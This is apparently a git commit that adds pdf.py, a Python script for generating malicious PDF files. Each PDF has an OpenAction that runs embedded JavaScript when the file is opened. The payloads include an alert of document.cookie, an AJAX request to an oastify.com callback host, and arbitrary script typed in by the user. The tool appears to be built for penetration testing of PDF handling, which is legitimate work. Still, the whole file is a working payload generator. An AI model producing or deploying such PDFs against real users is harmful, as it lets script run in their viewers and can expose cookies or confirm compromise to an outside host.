a8f26ed569c8f2b820e26829963e5c4ead4725a9
Kaan Atmaca <57772940+kaanatmacaa@users.noreply.github.com>
2023-11-19 01:07:12 +0300

    first commit

---
+++ pdf.py
@@ -0,0 +1,68 @@
+import sys
+if sys.version_info[0] < 3:
+    raise SystemExit("Use Python 3 (or higher) only")    
+import io
+import bz2
+import base64
+
+
+def create_malpdf1(filename):
+    with open(filename, "w") as file:
+        file.write('''%PDF-1.7
+        1 0 obj
+        <</Pages 1 0 R /OpenAction 2 0 R>>
+        2 0 obj
+        <</S /JavaScript /JS (app.alert(1))
+        )>> trailer <</Root 1 0 R>>''')
+
+def create_malpdf2(filename):
+    with open(filename, "w") as file:
+        file.write('''%PDF-1.7
+        1 0 obj
+        <</Pages 1 0 R /OpenAction 2 0 R>>
+        2 0 obj
+        <</S /JavaScript /JS (app.alert(document.cookie))
+        )>> trailer <</Root 1 0 R>>''')
+
+def create_malpdf3(filename):
+    with open(filename, "w") as file:
+        file.write('''%PDF-1.7
+        1 0 obj
+        <</Pages 1 0 R /OpenAction 2 0 R>>
+        2 0 obj
+        <</S /JavaScript /JS (
+            app.alert(1);
+            $.ajax({
+                type: "GET",
+                url: "http://k3omu560zcqzxuva9xjdihzpogu7iy6n.oastify.com",
+                success: function(data){
+                    app.alert("OK");
+                },
+                error: function(xhr, status, error) {
+                    app.alert("Error: " + status);
+                }
+            });
+            app.alert(2);
+        )>> trailer <</Root 1 0 R>>''')
+
+def create_malpdf_input(filename, cin):
+    with open(filename, "w") as file:
+        file.write('''%PDF-1.7
+        1 0 obj
+        <</Pages 1 0 R /OpenAction 2 0 R>>
+        2 0 obj
+        <</S /JavaScript /JS ('''+cin+'''
+        )>> trailer <</Root 1 0 R>>''')
+
+if __name__ == "__main__":
+  print("[+] Creating PDF files..")
+  option = int(input("Input option 1 or 2: "))
+  if option == 1: 
+    create_malpdf1("test.pdf")
+    create_malpdf2("test2.pdf")
+    create_malpdf3("test3.pdf")
+  elif option == 2:
+    cin = input("Input script: ")
+    create_malpdf_input("test_input.pdf", cin)
+
+print("[-] Done!")
